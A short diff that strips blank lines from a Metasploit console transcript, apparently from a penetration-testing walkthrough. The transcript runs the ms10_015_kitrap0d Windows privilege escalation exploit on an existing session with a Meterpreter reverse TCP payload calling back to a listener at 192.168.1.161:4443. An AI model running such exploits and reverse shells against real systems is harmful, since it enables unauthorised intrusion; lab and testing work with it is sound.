@@ -124,8 +124,6 @@ Module options (exploit/windows/local/ms10_015_kitrap0d):
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    SESSION  1                yes       The session to run this module on.
-
-
 Payload options (windows/meterpreter/reverse_tcp):
 
    Name      Current Setting  Required  Description
@@ -133,15 +131,11 @@ Payload options (windows/meterpreter/reverse_tcp):
    EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
    LHOST     192.168.1.161    yes       The listen address
    LPORT     4443             yes       The listen port
-
-
 Exploit target:
 
    Id  Name
    --  ----
    0   Windows 2K SP4 - Windows 7 (x86)
-
-
 msf exploit(ms10_015_kitrap0d) > exploit
 
 >  Started reverse handler on 192.168.1.161:4443 
